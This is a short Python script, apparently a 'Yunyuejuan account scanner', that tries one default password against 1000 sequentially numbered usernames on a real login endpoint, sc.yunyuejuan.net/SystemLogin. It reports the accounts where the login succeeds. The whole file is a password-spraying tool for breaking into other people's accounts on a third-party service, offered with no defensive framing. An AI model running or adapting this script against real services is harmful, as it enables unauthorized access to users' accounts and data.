#!/usr/bin/python3
import requests
import sys
import time

print("""Yunyuejuan account scanner
Auther: 31core
Website: https://31core.pythonanywhere.com
""")

username = input("Username: ")
defpasswd = input("Default password: ")

def is_success(num):
    """Check if the account is accessible."""
    ret = requests.post("http://sc.yunyuejuan.net/SystemLogin", data = {
        "j_username": username + (3 - len(str(num))) * "0" + str(num),
        "j_password": defpasswd
    })

    if ret.text.find("找回密码") == -1:
        """Log in successfully."""
        return True
    return False

def main():
    print("Scanning...")
    for i in range(1000):
        sys.stdout.write("\r")
        sys.stdout.flush()
        t = time.time() #Timestamp before scan
        if is_success(i) == True:
            print(f"info: \"%s\" exist."%(username + (3 - len(str(i))) * "0" + str(i)))
        sys.stdout.write(f"{i} of 999 ({round(time.time() - t, 2)} s per item)")
print()
